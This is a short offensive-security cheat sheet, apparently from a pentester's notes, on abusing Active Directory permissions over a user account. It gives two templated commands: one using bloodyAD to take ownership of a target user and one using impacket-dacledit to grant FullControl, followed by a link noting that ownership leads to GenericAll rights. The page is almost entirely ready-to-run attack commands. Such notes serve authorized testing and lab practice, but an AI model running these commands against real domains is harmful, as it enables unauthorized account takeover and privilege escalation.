Become owner of target user:
```
bloodyAD --host '<ip>' -d '<domain>' -u '<ownedUser>' -p '<password>' set owner '<targetUsername>' '<username of new owner>'
```

Get full control of target user:
```
impacket-dacledit -action 'write' -rights 'FullControl' -principal '<owned>' -target '<target>' '<domain>'/'<owned user>':'<password>'
```


## Next steps
Becoming owner of target account automatically gives [[Utilities/Windows Bloodhound Perms/Over a User/GenericAll]] privileges